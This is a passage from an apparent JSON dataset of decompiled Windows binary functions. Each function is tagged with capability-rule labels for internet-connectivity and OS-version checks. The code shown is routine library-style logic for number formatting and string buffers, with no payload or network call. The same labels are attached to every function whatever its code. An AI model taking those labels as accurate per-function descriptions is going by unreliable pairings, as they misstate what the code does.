-1;\n                        } while (0 < var_54h);\n                    }\n                    puVar21 = puVar21 + 2;\n                    var_58h = var_58h + 1;\n                    var_40h = var_40h + -1;\n                } while (0 < var_40h);\n                iVar6 = iVar6 + 0xc002;\n                if (iVar6 < 1) {\ncode_r0x0041aae9:\n                    uVar19 = iVar6 + 0xffff;\n                    if (uVar19 < 0) {\n                        uVar13 = -(iVar6 + 0xffff) & 0xffff;\n                        uVar19 = uVar19 + uVar13;\n                        do {\n                            if ((var_10h & 1) != 0) {\n                                var_50h = var_50h + 1;\n                            }\n                            iVar3 = CONCAT22(var_8h._2_2_, var_8h);\n                            uVar15 = CONCAT22(var_ch._2_2_, var_ch);\n                            iVar6 = CONCAT22(var_ch._2_2_, var_ch);\n                            var_8h._0_2_ = CONCAT22(var_8h._2_2_, var_8h) >> 1;\n                            var_8h._2_2_ = var_8h._2_2_ >> 1;\n                            var_ch._2_2_ = var_ch._2_2_ >> 1 | (iVar3 << 0x1f) >> 0x10;\n                            uVar11 = CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) >> 1;\n                            var_10h._2_2_ = var_10h._2_2_ >> 1 | (iVar6 << 0x1f) >> 0x10;\n                            uVar13 = uVar13 - 1;\n                            var_ch._0_2_ = uVar15 >> 1;\n                            var_10h._0_1_ = uVar11;\n                            var_10h._1_1_ = uVar11 >> 8;\n                        } while (uVar13 != 0);\n                        if (var_50h != 0) {\n                            var_10h._0_1_ = var_10h | 1;\n                        }\n                    }\n                }\n                else {\n                    do {\n                        uVar9 = var_ch._2_2_;\n                        uVar19 = var_10h._2_2_;\n                        if (var_8h._2_2_ < 0) break;\n                        iVar3 = CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) << 1;\n                        var_10h._0_1_ = iVar3;\n                        var_10h._1_1_ = iVar3 >> 8;\n                        var_10h._2_2_ = iVar3 >> 0x10;\n                        iVar3 = CONCAT22(var_ch._2_2_, var_ch) * 2;\n                        var_ch._0_2_ = iVar3 | uVar19 >> 0xf;\n                        var_ch._2_2_ = iVar3 >> 0x10;\n                        iVar3 = CONCAT22(var_8h._2_2_, var_8h) * 2;\n                        var_8h._0_2_ = iVar3 | uVar9 >> 0xf;\n                        iVar6 = iVar6 + 0xffff;\n                        var_8h._2_2_ = iVar3 >> 0x10;\n                    } while (0 < iVar6);\n                    uVar19 = iVar6;\n                    if (uVar19 < 1) goto code_r0x0041aae9;\n                }\n                if ((0x8000 < CONCAT11(var_10h._1_1_, var_10h)) ||\n                   ((CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) & 0x1ffff) == 0x18000)) {\n                    if (CONCAT22(var_ch, var_10h._2_2_) == -1) {\n                        var_10h._2_2_ = 0;\n                        var_ch._0_2_ = 0;\n                        if (CONCAT22(var_8h, var_ch._2_2_) == -1) {\n                            var_ch._2_2_ = 0;\n                            var_8h._0_2_ = 0;\n                            if (var_8h._2_2_ == 0xffff) {\n                                var_8h._2_2_ = 0x8000;\n                                uVar19 = uVar19 + 1;\n                            }\n                            else {\n                                var_8h._2_2_ = var_8h._2_2_ + 1;\n                            }\n                        }\n                        else {\n                            iVar6 = CONCAT22(var_8h, var_ch._2_2_) + 1;\n                            var_ch._2_2_ = iVar6;\n                            var_8h._0_2_ = iVar6 >> 0x10;\n                        }\n                    }\n                    else {\n                        iVar6 = CONCAT22(var_ch, var_10h._2_2_) + 1;\n                        var_10h._2_2_ = iVar6;\n                        var_ch._0_2_ = iVar6 >> 0x10;\n                    }\n                }\n                noname_1 = CONCAT22(var_ch._2_2_, var_ch);\n                if (uVar19 < 0x7fff) {\n                    var_16h._1_1_ = uVar19 >> 8 | var_16h._1_1_ & 0x80;\n                    var_20h._0_2_ = var_10h._2_2_;\n                    arg_8h = CONCAT22(var_10h._2_2_, var_ch);\n                    var_1ch = var_ch._2_2_;\n                    var_1ah = CONCAT22(var_8h._2_2_, var_8h);\n                    var_16h._0_1_ = uVar19;\n                }\n                else {\n                    var_1ch = 0;\n                    var_20h._0_2_ = 0;\n                    arg_8h = var_10h._2_2_ << 0x10;\n                    iVar6 = (((var_16h._1_1_ & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;\n                    var_1ah = 0x80000000;\n                    var_16h._0_1_ = iVar6 >> 0x10;\n                    var_16h._1_1_ = iVar6 >> 0x18;\n                    noname_1 = CONCAT22(var_ch._2_2_, var_ch);\n                }\n                goto code_r0x0041abf0;\n            }\n            iVar6 = 0;\n        }\n        else {\n            iVar6 = (((var_16h._1_1_ & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;\n        }\n        var_1ch = 0;\n        arg_8h = 0;\n        var_20h._0_2_ = 0;\n        var_1ah = iVar6 << 0x10;\n        var_16h._0_1_ = iVar6 >> 0x10;\n        var_16h._1_1_ = iVar6 >> 0x18;\n        noname_1 = 0;\n    }\ncode_r0x0041abf0:\n    var_10h._2_2_ = arg_8h >> 0x10;\n    var_20h._2_2_ = arg_8h;\n    *arg_1ch = var_4ch;\n    if (((arg_18h & 1) == 0) || (arg_14h = arg_14h + var_4ch,  0 < arg_14h)) {\n        if (0x15 < arg_14h) {\n            arg_14h = 0x15;\n        }\n        iVar6 = CONCAT11(var_16h._1_1_, var_16h) - 0x3ffe;\n        var_16h._0_1_ = 0;\n        var_16h._1_1_ = 0;\n        var_44h = 8;\n        do {\n            uVar19 = var_20h._2_2_;\n            var_1ah._2_2_ = var_1ah >> 0x10;\n            iVar3 = CONCAT22(var_20h._2_2_, var_20h) << 1;\n            var_20h._0_2_ = iVar3;\n            var_20h._2_2_ = iVar3 >> 0x10;\n            iVar3 = CONCAT22(var_1ah, var_1ch) * 2;\n            var_1ch = iVar3 | uVar19 >> 0xf;\n            iVar4 = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_)) * 2;\n            var_1ah._2_2_ = iVar4 | var_1ah >> 0xf;\n            var_44h = var_44h + -1;\n            var_1ah._0_2_ = iVar3 >> 0x10;\n            var_16h._0_1_ = iVar4 >> 0x10;\n            var_16h._1_1_ = iVar4 >> 0x18;\n        } while (var_44h != 0);\n        if ((iVar6 < 0) && (uVar13 = -iVar6 & 0xff,  uVar13 != 0)) {\n            do {\n                iVar3 = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_));\n                uVar11 = CONCAT22(var_1ah, var_1ch);\n                iVar6 = CONCAT22(var_1ah, var_1ch);\n                uVar15 = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_)) >> 1;\n                var_1ah._2_2_ = uVar15;\n                var_16h._0_1_ = uVar15 >> 0x10;\n                var_16h._1_1_ = var_16h._1_1_ >> 1;\n                var_1ah._0_2_ = var_1ah >> 1 | (iVar3 << 0x1f) >> 0x10;\n                uVar15 = CONCAT22(var_20h._2_2_, var_20h);\n                var_20h._2_2_ = var_20h._2_2_ >> 1 | (iVar6 << 0x1f) >> 0x10;\n                uVar13 = uVar13 - 1;\n                var_1ch = uVar11 >> 1;\n                var_20h._0_2_ = uVar15 >> 1;\n            } while (0 < uVar13);\n        }\n        piVar1 = arg_1ch + 2;\n        piVar16 = piVar1;\n        uVar19 = var_20h;\n        uVar9 = var_20h._2_2_;\n        uVar12 = var_1ch;\n        uVar18 = var_1ah;\n        for (arg_14h = arg_14h + 1; var_1ah = CONCAT22(var_1ah._2_2_, uVar18),  0 < arg_14h; arg_14h = arg_14h + -1) {\n            var_34h = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_));\n            uVar15 = CONCAT22(uVar9, uVar19) * 4;\n            uVar13 = CONCAT22(uVar18, uVar12) * 2;\n            uVar11 = (CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_)) * 2 | uVar18 >> 0xf) * 2 |\n                     uVar13 >> 0x1f;\n            uVar20 = (uVar13 | uVar9 >> 0xf) * 2 | (CONCAT22(uVar9, uVar19) << 1) >> 0x1f;\n            uVar13 = CONCAT22(uVar9, uVar19) + uVar15;\n            if ((uVar13 < uVar15) || (uVar15 = uVar20,  uVar13 < CONCAT22(uVar9, uVar19))) {\n                uVar15 = uVar20 + 1;\n                bVar5 = false;\n                if ((uVar15 < uVar20) || (uVar15 == 0)) {\n                    bVar5 = true;\n                }\n                if (bVar5) {\n                    uVar11 = uVar11 + 1;\n                }\n            }\n            uVar20 = CONCAT22(uVar18, uVar12) + uVar15;\n            if ((uVar20 < uVar15) || (uVar20 < CONCAT22(uVar18, uVar12))) {\n                uVar11 = uVar11 + 1;\n            }\n            iVar6 = (uVar11 + var_34h) * 2;\n            var_1ah._2_2_ = iVar6 | uVar20 >> 0x1f;\n            var_20h._0_2_ = uVar13 * 2;\n            var_20h._2_2_ = uVar13 * 2 >> 0x10;\n            var_16h._0_1_ = iVar6 >> 0x10;\n            var_1ch = uVar20 * 2 | uVar13 >> 0x1f;\n            *piVar16 = (iVar6 >> 0x18) + '0';\n            piVar16 = piVar16 + 1;\n            var_1ah._0_2_ = uVar20 * 2 >> 0x10;\n            var_16h._1_1_ = 0;\n            var_3ch._0_2_ = uVar19;\n            var_3ch._2_2_ = uVar9;\n            var_38h._0_2_ = uVar12;\n            var_38h._2_2_ = uVar18;\n            uVar19 = var_20h;\n            uVar9 = var_20h._2_2_;\n            uVar12 = var_1ch;\n            uVar18 = var_1ah;\n        }\n        piVar17 = piVar16 + -1;\n        var_20h._0_2_ = uVar19;\n        var_20h._2_2_ = uVar9;\n        var_1ch = uVar12;\n        if (*(piVar16 + -1) < '5') {\n            for (; (piVar1 <= piVar17 && (*piVar17 == '0')); piVar17 = piVar17 + -1) {\n            }\n            if (piVar17 < piVar1) {\n                *arg_1ch = 0;\n                *(arg_1ch + 3) = 1;\n                *(arg_1ch + 1) = ((uVar8 != 0x8000) - 1U & 0xd) + 0x20;\n                *piVar1 = 0x30;\n                *(arg_1ch + 5) = 0;\n                goto code_r0x0041adb8;\n            }\n        }\n        else {\n            for (; (piVar1 <= piVar17 && (*piVar17 == '9')); piVar17 = piVar17 + -1) {\n                *piVar17 = 0x30;\n            }\n            if (piVar17 < piVar1) {\n                piVar17 = piVar17 + 1;\n                *arg_1ch = *arg_1ch + 1;\n            }\n            *piVar17 = *piVar17 + '\\x01';\n        }\n        cVar14 = (piVar17 - arg_1ch) + -3;\n        *(arg_1ch + 3) = cVar14;\n        *(cVar14 + 4 + arg_1ch) = 0;\n    }\n    else {\n        *arg_1ch = 0;\n        *(arg_1ch + 3) = 1;\n        *(arg_1ch + 1) = ((uVar8 != 0x8000) - 1U & 0xd) + 0x20;\n        *(arg_1ch + 2) = 0x30;\n        *(arg_1ch + 5) = 0;\n    }\ncode_r0x0041adb8:\n    var_ch = noname_1;\n    fcn.0040b8b2(1);\n    return;\n}\n",
        "token_count": 9012
    },
    "004010f3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t fcn.004010f3(void)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    if (*extraout_ECX == 0) {\n        fcn.004090ab(0);\n        *(unaff_EBP + -4) = 0;\n        if (*extraout_ECX == 0) {\n            *0x4d2368 = *0x4d2368 + 1;\n            *extraout_ECX = *0x4d2368;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.004090d3();\n    }\n    iVar1 = *extraout_ECX;\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1;\n}\n",
        "token_count": 235
    },
    "00405073": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405073(uint *arg_8h)\n\n{\n    uint *in_EAX;\n    int32_t in_ECX;\n    uint *puVar1;\n    \n    if (arg_8h != NULL) {\n        in_EAX = in_ECX + 4;\n        puVar1 = in_EAX;\n        if (0xf < *(in_ECX + 0x18)) {\n            puVar1 = *in_EAX;\n        }\n        if (puVar1 <= arg_8h) {\n            if (0xf < *(in_ECX + 0x18)) {\n                in_EAX = *in_EAX;\n            }\n            if (arg_8h < *(in_ECX + 0x14) + in_EAX) {\n                return CONCAT31(in_EAX >> 8, 1);\n            }\n        }\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 202
    },
    "00405168": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405168(uint32_t param_1)\n\n{\n    code *pcVar1;\n    uint var_ch;\n    \n    if (param_1 == 0) {\n        param_1 = 0;\n    }\n    else if (0xffffffff / param_1 == 0) {\n        fcn.00401000(0);\n        fcn.0040a136(&var_ch, 0x4208b4);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.0040a0d1(param_1);\n    return;\n}\n",
        "token_count": 136
    },
    "004058a6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004058a6(uint arg_8h)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    \n    if (*in_ECX[9] == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = *in_ECX[0xd];\n    }\n    if (iVar2 < 1) {\n        uVar3 = (**(*in_ECX + 4))(arg_8h);\n    }\n    else {\n        *in_ECX[0xd] = *in_ECX[0xd] + -1;\n        puVar1 = *in_ECX[9];\n        *in_ECX[9] = puVar1 + 1;\n        *puVar1 = arg_8h;\n        uVar3 = arg_8h;\n    }\n    return uVar3;\n}\n",
        "token_count": 208
    },
    "00405b31": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405b31(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    int32_t iVar1;\n    \n    if (arg_ch == 1) {\n        if (*(in_ECX + 0x18) < 0x10) {\n            iVar1 = in_ECX + 4;\n        }\n        else {\n            iVar1 = *(in_ECX + 4);\n        }\n        *(iVar1 + arg_8h) = arg_10h;\n    }\n    else {\n        if (*(in_ECX + 0x18) < 0x10) {\n            iVar1 = in_ECX + 4;\n        }\n        else {\n            iVar1 = *(in_ECX + 4);\n        }\n        fcn.0040a220(iVar1 + arg_8h, arg_10h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "00405fd6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405fd6(uint arg_8h, int32_t arg_ch)\n\n{\n    uint arg_10h;\n    int32_t in_ECX;\n    \n    if ((arg_8h != '\\0') && (0xf < *(in_ECX + 0x18))) {\n        arg_10h = *(in_ECX + 4);\n        if (arg_ch != 0) {\n            fcn.00401082(in_ECX + 4, 0x10, arg_10h, arg_ch);\n        }\n        fcn.00409e64(arg_10h);\n    }\n    *(in_ECX + 0x18) = 0xf;\n    fcn.004058ee(arg_ch);\n    return;\n}\n",
        "token_count": 165
    },
    "00406021": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406021(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint *puVar3;\n    \n    if (*(in_ECX + 0x14) < arg_8h) {\n        fcn.00409736();\n    }\n    uVar2 = *(in_ECX + 0x14) - arg_8h;\n    if (uVar2 < arg_ch) {\n        arg_ch = uVar2;\n    }\n    if (arg_ch != 0) {\n        puVar3 = in_ECX + 4;\n        puVar1 = puVar3;\n        if (0xf < *(in_ECX + 0x18)) {\n            puVar1 = *puVar3;\n            puVar3 = *puVar3;\n        }\n        fcn.0040109e(puVar3 + arg_8h, *(in_ECX + 0x18) - arg_8h, puVar1 + arg_ch + arg_8h, uVar2 - arg_ch);\n        fcn.004058ee(*(in_ECX + 0x14) - arg_ch);\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "004060d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004060d4(uint noname_0, uint *arg_ch, uint arg_10h, uint arg_14h, uint8_t *arg_18h, int32_t arg_1ch)\n\n{\n    if (arg_1ch != 0) {\n        do {\n            fcn.00405bae(*arg_18h);\n            arg_1ch = arg_1ch + -1;\n            arg_18h = arg_18h + 1;\n        } while (arg_1ch != 0);\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = arg_14h;\n    return;\n}\n",
        "token_count": 149
    },
    "00406108": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406108(uint noname_0, uint *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    if (arg_1ch != 0) {\n        do {\n            fcn.00405bae(arg_18h);\n            arg_1ch = arg_1ch + -1;\n        } while (arg_1ch != 0);\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = arg_14h;\n    return;\n}\n",
        "token_count": 130
    },
    "0040615e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.0040615e(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t arg_10h;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    *(unaff_EBP + -0x10) = &var_18h;\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    uVar4 = *(unaff_EBP + 8) | 0xf;\n    if (uVar4 == 0xffffffff) {\n        uVar4 = *(unaff_EBP + 8);\n    }\n    else {\n        uVar1 = *(extraout_ECX + 0x18);\n        *(unaff_EBP + -0x14) = uVar1;\n        *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) >> 1;\n        uVar2 = *(unaff_EBP + -0x14);\n        if ((uVar4 / 3 < uVar2) && (uVar1 <= -uVar2 - 2)) {\n            uVar4 = uVar2 + uVar1;\n        }\n    }\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.00405895(uVar4 + 1);\n    *(unaff_EBP + -0x18) = uVar3;\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + 0xc) != 0) {\n        if (*(extraout_ECX + 0x18) < 0x10) {\n            arg_10h = extraout_ECX + 4;\n        }\n        else {\n            arg_10h = *(extraout_ECX + 4);\n        }\n        fcn.00401082(*(unaff_EBP + -0x18), uVar4 + 1, arg_10h, *(unaff_EBP + 0xc));\n    }\n    fcn.00405fd6(1, 0);\n    *(extraout_ECX + 4) = *(unaff_EBP + -0x18);\n    *(extraout_ECX + 0x18) = uVar4;\n    fcn.004058ee(*(unaff_EBP + 0xc));\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 661
    },
    "0040625d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040625d(uint noname_0, uint *arg_ch, uint arg_10h, uint arg_14h, uint8_t *arg_18h, int32_t arg_1ch)\n\n{\n    if (arg_1ch != 0) {\n        do {\n            fcn.00405bae(*arg_18h);\n            arg_1ch = arg_1ch + -1;\n            arg_18h = arg_18h + 1;\n        } while (arg_1ch != 0);\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = arg_14h;\n    return;\n}\n",
        "token_count": 149
    },
    "00406291": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl\nfcn.00406291(uint arg_8h, uint *arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, int32_t arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t arg_1ch_00;\n    uint var_10h;\n    uint var_8h;\n    \n    while( true ) {\n        iVar2 = fcn.0040a2c0(arg_18h, 0, arg_1ch);\n        arg_1ch_00 = arg_1ch;\n        if (iVar2 != 0) {\n            arg_1ch_00 = iVar2 - arg_18h;\n        }\n        puVar3 = fcn.0040625d(arg_8h, &var_8h, arg_10h, arg_14h, arg_18h, arg_1ch_00);\n        arg_10h = *puVar3;\n        arg_14h = puVar3[1];\n        if (arg_1ch - arg_1ch_00 == 0) break;\n        if (arg_20h != '\\0') {\n            puVar3 = fcn.00406108(arg_8h, &var_10h, *puVar3, puVar3[1], arg_20h, 1);\n            arg_10h = *puVar3;\n            arg_14h = puVar3[1];\n        }\n        arg_18h = arg_18h + arg_1ch_00 + 1;\n        arg_1ch = (arg_1ch - arg_1ch_00) + -1;\n    }\n    uVar1 = *puVar3;\n    arg_ch[1] = puVar3[1];\n    *arg_ch = uVar1;\n    return arg_ch;\n}\n",
        "token_count": 426
    },
    "004064c5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004064c5(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_ch_00;\n    int32_t in_ECX;\n    \n    if (arg_8h == 0xffffffff) {\n        fcn.004096fe();\n    }\n    if (*(in_ECX + 0x18) < arg_8h) {\n        fcn.0040615e(arg_8h, *(in_ECX + 0x14));\n    }\n    else if ((arg_ch == '\\0') || (0xf < arg_8h)) {\n        if (arg_8h == 0) {\n            fcn.004058ee(0);\n        }\n    }\n    else {\n        arg_ch_00 = *(in_ECX + 0x14);\n        if (arg_8h < *(in_ECX + 0x14)) {\n            arg_ch_00 = arg_8h;\n        }\n        fcn.00405fd6(1, arg_ch_00);\n    }\n    return arg_8h != 0;\n}\n",
        "token_count": 236
    },
    "00407406": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407406(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x28) == 0) {\n        arg_8h = arg_8h | 4;\n    }\n    fcn.004072af(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 84
    },
    "00407602": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.00407602(void)\n\n{\n    uint extraout_ECX;\n    uint extraout_EDX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    *(unaff_EBP + -0x10) = &var_18h;\n    *(unaff_EBP + -0x18) = extraout_EDX;\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    *(unaff_EBP + -4) = 0;\n    while (*(unaff_EBP + -0x18) != 0) {\n        fcn.00406bb7();\n        *(unaff_EBP + -0x18) = *(unaff_EBP + -0x18) + -1;\n        *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + 0x1c;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 341
    },
    "00407731": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407731(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    \n    if (arg_8h != 0) {\n        fcn.00407406(*(in_ECX + 8) | arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "0040792e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_5ch\n\nuint __cdecl\nfcn.0040792e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    char cVar1;\n    uint arg_1ch_00;\n    uint arg_18h_00;\n    uint arg_14h_00;\n    uint arg_ch_00;\n    uchar uVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    char *pcVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint uVar12;\n    uint var_60h;\n    uint var_5ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00409df4();\n    uVar3 = fcn.00401328(unaff_EBP + -0x20);\n    *(unaff_EBP + -4) = 0;\n    piVar4 = fcn.0040755a(uVar3);\n    *(unaff_EBP + -0x24) = piVar4;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00401210();\n    fcn.0040668d(unaff_EBP + -0x60);\n    *(unaff_EBP + -4) = 1;\n    uVar2 = (**(*piVar4 + 8))();\n    *(unaff_EBP + -0x1c) = uVar2;\n    *(unaff_EBP + -0x2c) = 0xf;\n    fcn.004058ee(0);\n    *(unaff_EBP + -4) = 2;\n    pcVar9 = *(unaff_EBP + 0x20);\n    cVar1 = *pcVar9;\n    if ((cVar1 == '+') || (*(unaff_EBP + -0x14) = 0,  cVar1 == '-')) {\n        *(unaff_EBP + -0x14) = 1;\n    }\n    puVar5 = 